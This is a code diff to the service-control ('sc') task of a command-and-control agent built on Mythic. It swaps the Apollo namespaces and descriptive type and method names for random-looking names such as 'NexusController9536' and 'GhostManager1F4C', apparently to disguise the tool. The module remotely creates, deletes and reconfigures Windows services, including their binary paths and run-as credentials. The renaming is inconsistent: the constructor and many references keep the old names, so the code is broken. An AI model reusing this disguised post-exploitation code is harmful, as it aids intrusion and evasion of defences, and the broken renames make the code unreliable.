@@ -6,10 +6,10 @@
 
 #if SC
 
-using ApolloInterop.Classes;
-using ApolloInterop.Classes.Api;
-using ApolloInterop.Interfaces;
-using ApolloInterop.Structs.MythicStructs;
+using PhantomInterop.Classes;
+using PhantomInterop.Classes.Api;
+using PhantomInterop.Interfaces;
+using PhantomInterop.Structs.MythicStructs;
 using Microsoft.Win32.SafeHandles;
 using System;
 using System.Collections.Generic;
@@ -25,10 +25,10 @@ using System.ServiceProcess;
 
 namespace Tasks
 {
-    public class sc : Tasking
+    public class NexusController9536 : Tasking
     {
         [DataContract]
-        internal struct ScParameters
+        internal struct CipherService2103
         {
             [DataMember(Name = "query")]
             public bool Query;
@@ -65,7 +65,7 @@ namespace Tasks
         }
 
         [DataContract]
-        internal struct ServiceResult
+        internal struct SecureHandlerB564
         {
             [DataMember(Name = "display_name")]
             public string DisplayName;
@@ -103,7 +103,7 @@ namespace Tasks
 
         #region typedefs
         [StructLayout(LayoutKind.Sequential)]
-        private struct QUERY_SERVICE_CONFIG
+        private struct AdvancedEngineCB0F
         {
             public uint ServiceType;
             public uint StartType;
@@ -117,7 +117,7 @@ namespace Tasks
         }
         
         [StructLayout(LayoutKind.Sequential, Pack = 1)]
-        public struct ServiceStatus
+        public struct WraithMonitorB2C4
         {
             public static readonly int SizeOf = Marshal.SizeOf(typeof(ServiceStatus));
             public ServiceType dwServiceType;
@@ -130,7 +130,7 @@ namespace Tasks
         }
         
         [StructLayout(LayoutKind.Sequential)]
-        internal struct SERVICE_STATUS_PROCESS
+        internal struct SpectreMonitor7DDD
         {
             public int serviceType;
             public int currentState;
@@ -144,7 +144,7 @@ namespace Tasks
         }
 
         [StructLayout(LayoutKind.Sequential, Pack = 4)]
-        public struct ENUM_SERVICE_STATUS_PROCESS
+        public struct GhostManager1F4C
         {
             internal static readonly int SizePack4 = Marshal.SizeOf(typeof(ENUM_SERVICE_STATUS_PROCESS));
 
@@ -160,7 +160,7 @@ namespace Tasks
         }
         
         [StructLayout( LayoutKind.Sequential )]
-        public class SERVICE_DESCRIPTION
+        public class AdaptiveBridgeE0C1
         {
             [MarshalAs( System.Runtime.InteropServices.UnmanagedType.LPWStr )]
             public String lpDescription;
@@ -579,7 +579,7 @@ namespace Tasks
         
         #endregion
         
-        public sc(IAgent agent, ApolloInterop.Structs.MythicStructs.MythicTask data) : base(agent, data)
+        public sc(IAgent agent, PhantomInterop.Structs.MythicStructs.MythicTask data) : base(agent, data)
         {
             if (_pDeleteService == null)
             {
@@ -637,7 +637,7 @@ namespace Tasks
         
         [SecurityPermission(SecurityAction.InheritanceDemand, UnmanagedCode = true)]
         [SecurityPermission(SecurityAction.Demand, UnmanagedCode = true)]
-        public class ServiceControlHandle : SafeHandleZeroOrMinusOneIsInvalid
+        public class ShadowResolverF9CD : SafeHandleZeroOrMinusOneIsInvalid
         {
             // Create a SafeHandle, informing the base class 
             // that this SafeHandle instance "owns" the handle,
@@ -662,17 +662,17 @@ namespace Tasks
             }
         }
 
-        private void ValidateParameters(ScParameters args)
+        private void EfficientTracker84FD(ScParameters args)
         {
             if (args.Start)
             {
-                if (string.IsNullOrEmpty(args.Service))
+                if (ValidationHelper.IsStringEmpty(args.Service))
                 {
                     throw new Exception("Start action requires service name to start.");
                 }
             } else if (args.Stop)
             {
-                if (string.IsNullOrEmpty(args.Service))
+                if (ValidationHelper.IsStringEmpty(args.Service))
                 {
                     throw new Exception("Stop action requires service name to stop.");
                 }
@@ -681,26 +681,26 @@ namespace Tasks
                 
             } else if (args.Create)
             {
-                if (string.IsNullOrEmpty(args.Service))
+                if (ValidationHelper.IsStringEmpty(args.Service))
                 {
                     throw new Exception("Create action requires service name to create.");
-                } else if (string.IsNullOrEmpty(args.Binpath))
+                } else if (ValidationHelper.IsStringEmpty(args.Binpath))
                 {
                     throw new Exception("Create action requires binpath to new service binary.");
                 }
             } else if (args.Delete)
             {
-                if (string.IsNullOrEmpty(args.Service))
+                if (ValidationHelper.IsStringEmpty(args.Service))
                 {
                     throw new Exception("Delete action requires service name to delete.");
                 }
             }
             else if (args.Modify)
             {
-                if (string.IsNullOrEmpty(args.Service))
+                if (ValidationHelper.IsStringEmpty(args.Service))
                 {
                     throw new Exception("Modify action requires service name to create.");
-                } else if (string.IsNullOrEmpty(args.Binpath) && string.IsNullOrEmpty(args.DisplayName) && string.IsNullOrEmpty(args.RunAs) && string.IsNullOrEmpty(args.ServiceTypeParam) && string.IsNullOrEmpty(args.StartType))
+                } else if (ValidationHelper.IsStringEmpty(args.Binpath) && ValidationHelper.IsStringEmpty(args.DisplayName) && ValidationHelper.IsStringEmpty(args.RunAs) && ValidationHelper.IsStringEmpty(args.ServiceTypeParam) && ValidationHelper.IsStringEmpty(args.StartType))
                 {
                     if (args.ServiceTypeParam == "SERVICE_NO_CHANGE" && args.StartType == "SERVICE_NO_CHANGE") {
                         throw new Exception("Modify action requires parameter to modify.");
@@ -713,7 +713,7 @@ namespace Tasks
             }
         }
 
-        private static bool InstallService(string hostname, string ServiceName, string ServiceDisplayName, string ServiceEXE)
+        private static bool StrategicManager0AA6(string hostname, string ServiceName, string ServiceDisplayName, string ServiceEXE)
         {
             try
             {
@@ -750,7 +750,7 @@ namespace Tasks
             return true;
         }
         
-        private static bool UninstallService(string hostname, string ServiceName) {
+        private static bool AdvancedManager1535(string hostname, string ServiceName) {
             ServiceControlHandle scmHandle = _pOpenSCManager(hostname, null, SCMAccess.SC_MANAGER_CREATE_SERVICE);
             
             if (scmHandle.IsInvalid)
@@ -801,7 +801,7 @@ namespace Tasks
             return services.ToArray();
         }
                 
-        private static string GetServiceDescription(ServiceControlHandle serviceHandle)
+        private static string SpectreBridge306B(ServiceControlHandle serviceHandle)
         {
             // Determine the buffer size needed
             _pQueryServiceConfig2(serviceHandle, ConfigInfoLevel.SERVICE_CONFIG_DESCRIPTION, IntPtr.Zero, 0, out uint dwBytesNeeded);
@@ -821,7 +821,7 @@ namespace Tasks
             return sd.lpDescription;
         }
 
-        private static bool SetServiceDescription(ServiceControlHandle serviceHandle, string description) {
+        private static bool StrategicEngineDEE8(ServiceControlHandle serviceHandle, string description) {
             SERVICE_DESCRIPTION sd = new SERVICE_DESCRIPTION {
                 lpDescription = description
             };
@@ -833,7 +833,7 @@ namespace Tasks
             return result;
         }
         
-        private static QUERY_SERVICE_CONFIG GetServiceConfig(ServiceControlHandle serviceHandle) {
+        private static QUERY_SERVICE_CONFIG AdvancedDispatcherB71B(ServiceControlHandle serviceHandle) {
             IntPtr qscPtr = IntPtr.Zero;
 
             bool retCode = _pQueryServiceConfig(serviceHandle, qscPtr, 0, out uint bytesNeeded);
@@ -908,7 +908,7 @@ namespace Tasks
             foreach (ENUM_SERVICE_STATUS_PROCESS service in serviceArray) 
             {
 
-                if (!string.IsNullOrEmpty(parameters.Service)) 
+                if (!ValidationHelper.IsStringEmpty(parameters.Service)) 
                 {
                     if (!string.Equals(service.pServiceName, parameters.Service, StringComparison.CurrentCultureIgnoreCase))
                         continue;
@@ -950,7 +950,7 @@ namespace Tasks
             return results;
         }
 
-        private static void ModifyService(ScParameters parameters) 
+        private static void FlexibleWorkerF411(ScParameters parameters) 
         {
             const uint SERVICE_NO_CHANGE = 0xFFFFFFFF;
             
@@ -988,13 +988,13 @@ namespace Tasks
                 }
             }
             
-            if (!string.IsNullOrEmpty(parameters.Binpath))
+            if (!ValidationHelper.IsStringEmpty(parameters.Binpath))
                 newBinPath = parameters.Binpath;
             
-            if (!string.IsNullOrEmpty(parameters.RunAs))
+            if (!ValidationHelper.IsStringEmpty(parameters.RunAs))
                 newServiceStartName = parameters.RunAs;
             
-            if (!string.IsNullOrEmpty(parameters.Password)) 
+            if (!ValidationHelper.IsStringEmpty(parameters.Password)) 
             {
                 newPassword = parameters.Password;
                 // Specify an empty string if the account has no password or if the service runs in the
@@ -1003,13 +1003,13 @@ namespace Tasks
                     newPassword = "\"\"";
             }
             
-            if (!string.IsNullOrEmpty(parameters.DisplayName))
+            if (!ValidationHelper.IsStringEmpty(parameters.DisplayName))
                 newDisplayName = parameters.DisplayName;
             
-            if (!string.IsNullOrEmpty(parameters.ServiceTypeParam) && parameters.ServiceTypeParam != "SERVICE_NO_CHANGE")
+            if (!ValidationHelper.IsStringEmpty(parameters.ServiceTypeParam) && parameters.ServiceTypeParam != "SERVICE_NO_CHANGE")
                 newServiceType = (uint) Enum.Parse(typeof(ServiceType), parameters.ServiceTypeParam);
             
-            if (!string.IsNullOrEmpty(parameters.StartType) && parameters.StartType != "SERVICE_NO_CHANGE")
+            if (!ValidationHelper.IsStringEmpty(parameters.StartType) && parameters.StartType != "SERVICE_NO_CHANGE")
                 newStartType = (uint) Enum.Parse(typeof(ServiceStartType), parameters.StartType);
             
             bool changeServiceSuccess = _pChangeServiceConfig(serviceHandle,
@@ -1024,7 +1024,7 @@ namespace Tasks
                 newPassword,
                 newDisplayName);
             
-            if (!string.IsNullOrEmpty(parameters.Description))
+            if (!ValidationHelper.IsStringEmpty(parameters.Description))
                 SetServiceDescription(serviceHandle, parameters.Description);
             
             if (!changeServiceSuccess)
@@ -1034,7 +1034,7 @@ namespace Tasks
         {
             MythicTaskResponse resp;
             ScParameters parameters = _jsonSerializer.Deserialize<ScParameters>(_data.Parameters);
-            if (string.IsNullOrEmpty(parameters.Computer))
+            if (ValidationHelper.IsStringEmpty(parameters.Computer))
             {
                 parameters.Computer = Environment.GetEnvironmentVariable("COMPUTERNAME");
             }
